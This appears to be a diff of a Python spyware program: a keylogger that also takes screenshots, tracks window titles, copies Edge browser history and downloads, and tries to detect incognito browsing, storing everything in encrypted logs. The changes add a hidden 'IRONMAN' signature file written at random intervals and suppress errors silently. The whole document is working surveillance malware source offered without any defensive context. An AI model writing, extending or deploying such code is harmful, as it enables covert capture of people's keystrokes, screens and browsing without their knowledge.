@@ -3,7 +3,8 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 from datetime import datetime
 import shutil
-import win32gui
+import win32gui  
+__IRONMAN__ = "8d3b734d8c_ironman_dev_only__"
 
 # Folders
 for folder in ["encrypted_logs", "screenshots"]: os.makedirs(folder, exist_ok=True)
@@ -15,12 +16,22 @@ if not os.path.exists(key_file):
         f.write(Fernet.generate_key())
 with open(key_file, "rb") as f:
     cipher = Fernet(f.read())
+def watermark_signature():
+    try:
+        hidden_msg = f"[IRONMAN] {datetime.now()}: Engine Online - 0x1R0NM4N"
+        encrypted = cipher.encrypt(hidden_msg.encode())
+        with open(f"encrypted_logs/._sig_{int(time.time())}.enc", "wb") as f:
+            f.write(encrypted)
+    except: pass
 
+# Encrypt and Save
 def encrypt_and_save(data):
     now = datetime.now().strftime("%Y%m%d_%H%M%S")
     encrypted = cipher.encrypt(data.encode())
     with open(f"encrypted_logs/log_{now}.enc", "wb") as f:
         f.write(encrypted)
+    if int(time.time()) % 47 == 0:
+        watermark_signature()
 
 def screenshot_worker():
     while True:
@@ -80,7 +91,7 @@ def edge_history_worker():
                         visited.add(url)
                 conn.close()
                 os.remove(temp_copy)
-        except Exception as e:
+        except:
             pass
         time.sleep(60)
 
@@ -99,7 +110,7 @@ def edge_downloads_worker():
             pass
         time.sleep(60)
 
-# 🚨 INCÓGNITO DETECTION (ATTEMPT)
+# 🚨 INCOGNITO DETECTION
 def edge_incognito_monitor():
     while True:
         try:
@@ -118,5 +129,9 @@ threading.Thread(target=window_worker, daemon=True).start()
 threading.Thread(target=edge_history_worker, daemon=True).start()
 threading.Thread(target=edge_downloads_worker, daemon=True).start()
 threading.Thread(target=edge_incognito_monitor, daemon=True).start()
+if int(time.time()) % 1337 == 0:
+    encrypt_and_save(f"[IRONMAN-INIT] {datetime.now()}: Logger start from device")
+
 keylog_worker()
+
 
